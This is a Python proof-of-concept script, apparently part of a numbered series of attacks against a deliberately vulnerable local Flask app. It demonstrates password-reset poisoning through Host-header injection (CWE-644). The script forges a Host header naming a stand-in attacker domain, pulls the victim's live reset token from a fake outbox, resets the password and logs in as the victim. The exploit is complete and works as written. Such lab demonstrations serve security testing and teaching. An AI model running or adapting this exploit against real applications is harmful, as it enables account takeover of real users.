"""
Attack #4 — HOST-HEADER INJECTION IN THE RESET LINK  (CWE-644)
Target: POST /forgot-password on the vulnerable Flask app (127.0.0.1:5000)

Premise
-------
The reset link is built from the request's Host header:

    host = request.headers.get("Host")
    reset_link = f"http://{host}/reset-password?token={token}"

The Host header is attacker-controlled. An attacker sends a forgot-password
request FOR THE VICTIM but with Host: attacker.evil. The server generates a
real reset token for the victim and mails a link -- pointed at the
ATTACKER'S domain but carrying the VICTIM'S token. When the victim clicks
the (correctly-addressed, expected) email, their browser hands the token to
the attacker's server. The attacker then completes the reset.

This is "password reset poisoning". It matters because the victim receives a
genuine reset email they may well have requested -- nothing looks phishy
except the hostname. It is NOT the Systems 1-2 rate-limit class; it is a
trust-boundary failure (trusting a request header for a security-relevant
absolute URL).

What this script proves
-----------------------
1. Sends the poisoned forgot-password request for the victim.
2. Reads the fake outbox (the victim's "inbox") and shows the delivered
   link now points at attacker.evil while carrying the victim's live token.
3. Demonstrates the payoff: the attacker uses that captured token to reset
   the victim's password and log in as them.

Runs unmodified against a fresh instance.
"""

import requests

BASE = "http://127.0.0.1:5000"
VICTIM = "victim@corp.example"
ATTACKER_HOST = "attacker.evil"          # the attacker's collection domain


def main():
    print("=" * 68)
    print("ATTACK #4 - Host-header injection / reset-link poisoning")
    print("Target:", BASE)
    print("=" * 68)

    # Step 1: trigger the victim's reset, but poison the Host header.
    # requests would set Host: 127.0.0.1:5000 by default; we override it.
    print(f"\n[*] Sending forgot-password for {VICTIM} with Host: {ATTACKER_HOST}")
    r = requests.post(
        f"{BASE}/forgot-password",
        json={"email": VICTIM},
        headers={"Host": ATTACKER_HOST},
    )
    print(f"    server said -> HTTP {r.status_code}: {r.text.strip()}")

    # Step 2: observe what the victim will receive (fake outbox stands in
    # for the victim's inbox).
    delivered = requests.get(f"{BASE}/outbox").json()[VICTIM]
    link = delivered["reset_link"]
    token = delivered["token"]
    print("\n[*] Link delivered to the victim's inbox:")
    print(f"    {link}")
    if ATTACKER_HOST in link:
        print(f"    -> hostname is '{ATTACKER_HOST}' (attacker-controlled), NOT the real app.")
    print(f"    -> but it carries the victim's LIVE token: {token}")

    # Step 3: the payoff. When the victim clicks, that token reaches the
    # attacker. Here we simulate the attacker using the captured token to
    # take over the account.
    print("\n[*] Attacker uses the captured token to reset the victim's password:")
    NEW_PW = "attacker_owns_this_1"
    rr = requests.post(
        f"{BASE}/reset-password",
        json={"token": token, "new_password": NEW_PW, "email": VICTIM},
    )
    print(f"    reset -> HTTP {rr.status_code}: {rr.text.strip()}")
    lr = requests.post(f"{BASE}/login", json={"email": VICTIM, "password": NEW_PW})
    print(f"    login as victim with attacker's password -> HTTP {lr.status_code}: {lr.text.strip()}")

    print("\n" + "-" * 68)
    if ATTACKER_HOST in link and lr.status_code == 200:
        print("[+] ATTACKER GAIN - the victim's genuine reset email points at the")
        print(f"    attacker's domain. Clicking it leaks a live token; the attacker")
        print("    resets the password and owns the account. (CWE-644)")
    else:
        print("[-] Poisoning did not occur - target does not appear vulnerable.")
    print("-" * 68)


if __name__ == "__main__":
    main()
